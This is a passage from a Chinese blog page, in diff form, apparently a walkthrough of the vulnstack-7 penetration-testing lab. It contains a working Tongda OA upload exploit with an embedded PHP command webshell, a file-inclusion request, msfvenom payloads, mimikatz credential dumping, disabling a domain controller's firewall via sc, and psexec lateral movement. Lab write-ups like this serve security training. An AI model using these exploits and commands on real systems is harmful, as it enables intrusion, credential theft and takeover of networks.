+server_port = 9100</p>
+<p>[plugin_socks]<br>
+type = tcp<br>
+remote_port = 9101<br>
+plugin = socks5</p>
+<h4 id="扫描端口"><a class="header-anchor" href="#扫描端口">¶</a><em><strong>*扫描端口*</strong></em></h4>
+<p>接着，我们使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：</p>
+<p>use auxiliary/scanner/discovery/udp_probe<br>
+set rhosts 192.168.52.1-255<br>
+set threads 5<br>
+run</p>
+<img src="/posts/f656209c/wps44.jpg" class title="img"> 
+<p>对192.168.52.30进行识别</p>
+<p>nmap -sV 192.168.52.30</p>
+<img src="/posts/f656209c/wps45.jpg" class title="img"> 
+<p>访问80端口发现是一个通达oa页面（使用socks5代理访问）存在漏洞，手工复现一波，抓包</p>
+<p>POST /ispirit/im/upload.php HTTP/1.1<br>
+Host: 192.168.52.30:8080<br>
+Content-Length: 658<br>
+Cache-Control: no-cache<br>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br>
+Accept: <em>/</em><br>
+Accept-Encoding: gzip, deflate<br>
+Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br>
+Cookie: PHPSESSID=123<br>
+Connection: close</p>
+<p>------WebKitFormBoundarypyfBh1YB4pV8McGB<br>
+Content-Disposition: form-data; name=“UPLOAD_MODE”</p>
+<p>2<br>
+------WebKitFormBoundarypyfBh1YB4pV8McGB<br>
+Content-Disposition: form-data; name=“P”</p>
+<p>123<br>
+------WebKitFormBoundarypyfBh1YB4pV8McGB<br>
+Content-Disposition: form-data; name=“DEST_UID”</p>
+<p>1<br>
+------WebKitFormBoundarypyfBh1YB4pV8McGB<br>
+Content-Disposition: form-data; name=“ATTACHMENT”; filename=“jpg”<br>
+Content-Type: image/jpeg</p>
+<?php
+$command=$_POST['cmd'];
+$wsh = new COM('WScript.shell');
+$exec = $wsh->exec("cmd /c ".$command);
+$stdout = $exec->StdOut();
+$stroutput = $stdout->ReadAll();
+echo $stroutput;
+?>
+<p>------WebKitFormBoundarypyfBh1YB4pV8McGB–</p>
+<img src="/posts/f656209c/wps46.jpg" class title="img"> 
+<p>POST /ispirit/interface/gateway.php HTTP/1.1<br>
+Host: 192.168.52.30:8080<br>
+Connection: keep-alive<br>
+Accept-Encoding: gzip, deflate<br>
+Accept: <em>/</em><br>
+User-Agent: python-requests/2.21.0<br>
+Content-Length: 70<br>
+Content-Type: application/x-www-form-urlencoded</p>
+<p>json={“url”:“/general/…/…/attach/im/2309/531433566.jpg”}&amp;cmd=whoami</p>
+<img src="/posts/f656209c/wps47.jpg" class title="img"> 
+<p>OK，直接上工具，代理改一下直接检测，上传马子</p>
+<img src="/posts/f656209c/wps48.jpg" class title="img"> 
+<p>蚁剑连接<img src="/posts/f656209c/wps49.jpg" class title="img"></p>
+<p>上传一个msf的exe，上线之后添加路由</p>
+<p>msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.93.20 LPORT=4444 -f exe &gt; msf.exe<br>
+use exploit/multi/handler<br>
+set payload windows/x64/meterpreter/bind_tcp<br>
+set lport 4302<br>
+set rhost 192.168.93.20<br>
+run</p>
+<img src="/posts/f656209c/wps50.jpg" class title="img"> 
+<p>然后扫描一下93网段存活的主机（我这里设置的范围比较小，怕扫着扫着会话死掉，或者靶机崩了，已经重做很多次），40的机器很明显是域控<img src="/posts/f656209c/wps51.jpg" class title="img"></p>
+<p>扫一下永恒之蓝，尝试了一下域控没上线<img src="/posts/f656209c/wps52.jpg" class title="img"></p>
+<p>回到pc1的会话，收集一下基本信息，然后查看账户密码</p>
+<p>load kiwi<br>
+migrate 进程（ps查看，迁移到64位的system权限的）<br>
+kiwi_cmd privilege::debug<br>
+kiwi_cmd sekurlsa::logonpasswords</p>
+<p><img src="/posts/f656209c/wps53.jpg" alt="img"><img src="/posts/f656209c/wps54.jpg" alt="img"><img src="/posts/f656209c/wps55.jpg" alt="img"></p>
+<h1><em><strong>*上线DC*</strong></em></h1>
+<p>得到了域控的账号密码，关掉防火墙之后用模块上线</p>
+<p>shell<br>
+net use \192.168.93.30\ipc$ “Whoami2021” /user:“Administrator”<br>
+sc \192.168.93.30 create unablefirewall binpath= “netsh advfirewall set allprofiles state off”<br>
+sc \192.168.93.30 start unablefirewall</p>
+<img src="/posts/f656209c/wps56.jpg" class title="img"> 
+<p>use exploit/windows/smb/psexec<br>
+set payload windows/meterpreter/bind_tcp<br>
+set rhost 192.168.93.30<br>
+set smbuser administrator<br>
+set smbpass Whoami2021</p>
+<p><img src="/posts/f656209c/wps57.jpg" alt="img"><img src="/posts/f656209c/wps58.jpg" alt="img"></p>
+<h1><em><strong>*上线pc2*</strong></em></h1>
+<p>很多方法，第一种用永恒之蓝打，但是很难打出来，而且很容易死会话，而且是一死全死那种<img src="/posts/f656209c/wps59.jpg" class title="img"></p>
+<p>第二种就是和上线DC一样的方法，利用模块，但是我的靶机不对劲，登录上去<img src="/posts/f656209c/wps60.jpg" class title="img"></p>
+<p>第三种是将msf的session派发给cs利用cs上线<img src="/posts/f656209c/wps61.jpg" class title="img"></p>
+<p>至此拿下全部机器，在贴一张msf的sessions图</p>
+<img src="/posts/f656209c/wps62.jpg" class title="img"> 
+<p>🌄🌄🌄🌄🌄🌄🌇🌇🌇🌇🌇🌇🌇</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91/" class="category-chain-item">内网</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/">#靶场</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91/">#内网</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>红日内网靶场vulnstack-7</div>
+      <div>https://jsweetcoffee.github.io/posts/f656209c.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>SCxiaoyun</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/e3c3c3a8.html" title="hydra的基本使用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">hydra的基本使用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/8487c21c.html" title="Xray的基本使用">
+                        <span class="hidden-mobile">Xray的基本使用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ejWQ4cLgEdFyaqpxh7H74jUL-gzGzoHsz","appKey":"esK2EV3cfDXbDYkhTkNEHyHD","path":"window.location.pathname","placeholder":"吐槽一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true,"verify":false,"notify":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+
+  
+  <script
+  async
+  defer
+  src="http://49.233.251.176:10087/api/application/embed?protocol=http&host=49.233.251.176:10087&token=0c8a92daa216c5bf">
+  </script>
+</div>  
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"rect":"opacity:0.5","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
